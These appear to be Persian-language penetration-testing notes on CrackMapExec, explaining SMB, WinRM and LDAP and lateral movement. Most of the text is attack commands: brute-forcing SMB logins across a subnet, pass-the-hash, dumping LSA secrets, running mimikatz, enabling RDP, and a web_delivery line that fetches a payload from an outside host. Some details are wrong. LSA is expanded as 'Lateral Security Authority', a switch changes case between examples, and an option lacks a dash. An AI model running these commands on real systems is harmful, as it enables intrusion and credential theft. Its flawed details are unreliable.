## ۱. مفاهیم پایه پروتکل‌ها

### SMB (Server Message Block)

- پروتکلی است که ویندوز برای به اشتراک گذاشتن فایل‌ها، چاپگرها و دیگر منابع شبکه استفاده می‌کند.
    
- اجازه می‌دهد سیستم‌ها فایل‌ها و فولدرها را در شبکه به اشتراک بگذارند و به آن‌ها دسترسی داشته باشند.
    
- همچنین امکان اجرای دستورات و مدیریت سرویس‌ها روی سیستم‌های راه دور را فراهم می‌کند.
    
- یکی از پروتکل‌های کلیدی در حملات حرکت جانبی است، چون با استفاده از آن می‌توان به راحتی به منابع ویندوزی دسترسی پیدا کرد.
    

---

### WinRM (Windows Remote Management)

- یک پروتکل و سرویس ویندوز است برای مدیریت و اجرای دستورات از راه دور (Remote Management).
    
- مبتنی بر پروتکل استاندارد WS-Management است و به مدیران سیستم امکان می‌دهد کامپیوترهای ویندوزی را از راه دور کنترل کنند.
    
- با WinRM می‌توان دستورات PowerShell و اسکریپت‌ها را روی سیستم‌های راه دور اجرا کرد.
    
- بسیار امن‌تر و کنترل‌پذیرتر از SMB است و معمولاً در محیط‌های مدیریت سازمانی استفاده می‌شود.
    

---

### LDAP (Lightweight Directory Access Protocol)

- پروتکلی برای دسترسی و مدیریت اطلاعات دایرکتوری (مثل دامین کنترلرها، کاربران، گروه‌ها) در شبکه است.
    
- در شبکه‌های ویندوز، LDAP برای ارتباط با Active Directory به کار می‌رود.
    
- مهاجم می‌تواند با استفاده از LDAP اطلاعات مربوط به ساختار شبکه، کاربران، گروه‌ها و منابع را جمع‌آوری کند که برای حرکت جانبی بسیار حیاتی است.
    

---

## ۲. CrackMapExec (CME) و ارتباط با این پروتکل‌ها

CME یک ابزار قوی است که می‌تواند از این پروتکل‌ها برای **حرکت جانبی** و عملیات نفوذ استفاده کند.

- **SMB:** برای اتصال به سیستم هدف، اجرای دستورات، آپلود فایل و کار با منابع شبکه استفاده می‌شود.
    
- **WinRM:** برای اجرای دستورات و اسکریپت‌های PowerShell از راه دور، به ویژه در محیط‌هایی که WinRM فعال و مجاز است.
    
- **LDAP:** برای جمع‌آوری اطلاعات ساختار شبکه، کاربران، گروه‌ها و سیاست‌ها از دامین کنترلر.
    

---

## ۳. Lateral Movement با CrackMapExec

- ابتدا CME با اسکن شبکه، سیستم‌های ویندوزی که پروتکل‌های بالا روی آن‌ها فعال است را پیدا می‌کند.
    
- سپس با اعتبارنامه‌های معتبر (پسورد یا هش NTLM) به سیستم‌ها وصل می‌شود.
    
- دستورات دلخواه را از طریق SMB یا WinRM روی سیستم‌ها اجرا می‌کند.
    
- در طول این مسیر، با استفاده از LDAP اطلاعات بیشتری درباره دامین و کاربران جمع‌آوری می‌کند تا بهترین هدف‌ها برای حرکت جانبی را پیدا کند.
    
- این روند تکرار می‌شود تا مهاجم بتواند دسترسی خود را در کل شبکه گسترش دهد.

## چند سوییچ مهم CrackMapExec

| سوییچ                  | توضیح                                              | مثال استفاده                              |
| ---------------------- | -------------------------------------------------- | ----------------------------------------- |
| `-u USERNAME`          | نام کاربری برای لاگین به سیستم‌ها                  | `-u administrator`                        |
| `-p PASSWORD`          | پسورد مربوط به یوزرنیم                             | `-p Passw0rd!`                            |
| `-H HASH`              | هش NTLM به جای پسورد (برای لاگین بدون پسورد)       | `-H aad3b435b51404eeaad3b435b51404ee:...` |
| `-d DOMAIN`            | دامین یا نام گروه کاری (Workgroup)                 | `-d CORP`                                 |
| `-x COMMAND`           | اجرای دستور خاص روی سیستم‌های هدف                  | `-x 'ipconfig /all'`                      |
| `--exec-method METHOD` | روش اجرای دستور (مثلاً smb، wmi، dcom، powershell) | `--exec-method smb`                       |
| `-M MODULE`            | اجرای ماژول خاص CME برای اسکن یا اکسپلویت          | `-M mimikatz`                             |
| `-t THREADS`           | تعداد Thread برای اجرای موازی عملیات               | `-t 10`                                   |
| `--shares`             | لیست کردن اشتراک‌های (Shares) سیستم هدف            | `--shares`                                |
| `--sessions`           | نمایش سشن‌های فعال                                 | `--sessions`                              |
| `-i`                   | اجرای حالت interactive (تعاملی)                    | `-i`                                      |

## مثال کامل

فرض کن می‌خوای روی شبکه `192.168.1.0/24` با یوزر `admin` و پسورد `Pass123` دستوری اجرا کنی:

```bash
cme smb 192.168.1.0/24 -u admin -p Pass123 -x 'whoami'
```

---

## نکته

- اگر بخوای با هش NTLM لاگین کنی، به جای `-p` از `-H` استفاده می‌کنی.
    
- `--exec-method` بهت کنترل می‌ده که دستورات رو چطوری روی سیستم هدف اجرا کنی (مثلاً از طریق SMB یا WMI).
    
- `-M mimikatz` یکی از ماژول‌های محبوب CME برای استخراج Credential است.

## Brute Force روی SMB با CrackMapExec

### دستور کلی:

```bash
cme smb <target> -u <username> -p <password-list>
```

یا اگر بخوای روی لیست یوزر و پسورد انجام بدی:

```bash
cme smb <target> -u <user-list> -p <password-list>
```

---

### مثال عملی:

فرض کنیم می‌خوای روی IP خاصی برودفورس بزنی:

```bash
cme smb 192.168.1.10 -u admin -p /path/to/passwords.txt
```

- `192.168.1.10` : آدرس هدف
    
- `-u admin` : نام کاربری که میخوای پسوردها رو روی اون تست کنی
    
- `-p /path/to/passwords.txt` : فایل پسوردها (هر خط یک پسورد)
    

---

### اگر بخوای روی چندین یوزر و پسورد تست کنی:

```bash
cme smb 192.168.1.0/24 -u /path/to/usernames.txt -p /path/to/passwords.txt
```

- روی کل رنج آی‌پی 192.168.1.0 تا 255 برودفورس اجرا می‌کنه.
    

---

### نکات مهم:

- CME خودش مدیریت برودفورس رو انجام میده و نتایج موفق رو بهت نشون میده.
    
- می‌تونی گزینه `-t` رو اضافه کنی تا تعداد Thread ها رو کنترل کنی (برای سرعت بیشتر یا کمتر):
    

```bash
cme smb 192.168.1.0/24 -u admin -p /path/to/passwords.txt -t 10
```

---

---

### `-local-auth`

این گزینه باعث می‌شود CME **فقط از اعتبارنامه‌های کاربری محلی (Local Account)** روی سیستم هدف استفاده کند و **از دامین اکانت‌ها استفاده نکند**.

---

### یعنی چی؟

- وقتی این سوئیچ فعال باشد، CME سعی می‌کند با یوزرنیم و پسوردهایی که مربوط به حساب‌های محلی خود سیستم هدف هستند لاگین کند (مثل Administrator محلی یا هر کاربر محلی دیگر).
    
- برای شبکه‌هایی که دامین ندارند یا می‌خواهی فقط حساب‌های محلی را تست کنی مفید است.
    
- در غیر اینصورت، اگر دامین وجود داشته باشد، CME معمولا اعتبارنامه‌ها را به شکل `DOMAIN\User` ارسال می‌کند.
    

---

### کاربرد عملی

مثلاً:

```bash
cme smb 192.168.1.10 -u admin -p Pass123 -local-auth
```

یعنی تلاش می‌کنه با `admin` و `Pass123` روی اکانت محلی سیستم با IP 192.168.1.10 وارد شود، نه اکانت دامین.

---

سوئیچ `-x` در **CrackMapExec** برای **اجرای دستورات دلخواه (Custom Commands)** روی سیستم‌های هدف استفاده می‌شود.

---

### توضیح دقیق‌تر:

- وقتی با CME به سیستم یا سیستم‌های هدف متصل شدی، با `-x` می‌تونی یک دستور خاص (مثل `whoami`، `ipconfig`، یا هر دستور دیگه‌ای) رو روی سیستم هدف اجرا کنی.
    
- این دستور روی هر سیستمی که CME بهش وصل میشه اجرا میشه و نتیجه‌اش رو در خروجی می‌بینی.
    

---

### مثال:

```bash
cme smb 192.168.1.10 -u admin -p Pass123 -X "whoami"
```

- این دستور روی سیستم 192.168.1.10، با یوزرنیم `admin` و پسورد `Pass123` وصل میشه و دستور `whoami` رو اجرا می‌کنه که نام کاربری فعلی در سیستم هدف رو نشون میده.
    

---

### نکات:

- می‌تونی هر دستوری که روی سیستم هدف قابل اجراست رو اینجا بزاری.
    
- معمولاً برای گرفتن اطلاعات سریع یا تست دستورات استفاده میشه.

البته! سوئیچ `--lsa` در **CrackMapExec** مربوط به استخراج اطلاعات حساس از سیستم هدف است.

---

### `--lsa`

- این سوئیچ باعث می‌شود CME از طریق **Lateral Security Authority (LSA) Secrets** در ویندوز، اطلاعات حساس (مثل پسوردهای ذخیره شده، توکن‌ها، و داده‌های مهم امنیتی) را استخراج کند.
    
- به عبارتی، با این گزینه CME تلاش می‌کند **رمزهای ذخیره‌شده و اطلاعات امنیتی مهم در سیستم هدف را بخواند**.
    

---

### کاربرد

- معمولا در تست نفوذ برای جمع‌آوری Credential ها استفاده می‌شود.
    
- برای اجرای موفق این عملیات، معمولاً نیاز به دسترسی سطح بالا (مثل Administrator) روی سیستم هدف است.
    
- مشابه کاری است که ابزارهایی مثل Mimikatz انجام می‌دهند.
    

---

### مثال:

```bash
cme smb 192.168.1.10 -u admin -p Pass123 --lsa
```

- این دستور با یوزرنیم `admin` و پسورد `Pass123` به سیستم متصل می‌شود و تلاش می‌کند اطلاعات حساس LSA را استخراج کند.

```
crackmapexec smb x.x.x.x -u administrator -H sfovsfobo435q435bsdfbsrbs4lnwblsdfb
``` 

سوئیچ `-M` (یا `-m` در بعضی نسخه‌ها) در **CrackMapExec** برای **اجرای ماژول‌های داخلی (Modules)** استفاده می‌شود.

---

### توضیح دقیق‌تر:

- CME چندین ماژول (مثل `mimikatz`، `wmi`, `pass-the-hash` و غیره) دارد که می‌توانند کارهای خاصی انجام دهند.
    
- با استفاده از سوئیچ `-M`، می‌تونی یک ماژول خاص را روی سیستم هدف اجرا کنی.
    
- این ماژول‌ها معمولاً برای استخراج Credential، اجرای اکسپلویت‌ها، یا جمع‌آوری اطلاعات پیشرفته به کار می‌روند.
    

---

### مثال:

```bash
cme smb 192.168.1.10 -u admin -p Pass123 -M mimikatz
```

- این دستور با حساب `admin` به سیستم وصل می‌شود و ماژول `mimikatz` را اجرا می‌کند تا Credential ها را استخراج کند.
    

---

### نکات:

- هر ماژول کاربرد خاصی دارد؛ مثلاً `mimikatz` برای استخراج پسوردها، `wmi` برای اجرای دستورات از راه دور و غیره.
    
- قبل از اجرای ماژول‌ها باید اعتبارنامه مناسب داشته باشی.

```
cme smb 192.168.1.10 -u admin -p Pass123 -M web_delivery -o http://x.x.x.x/sfdlvnsdf
```

```
cme smb 192.168.1.10 -u admin -p Pass123 -M rdp -o enable
```
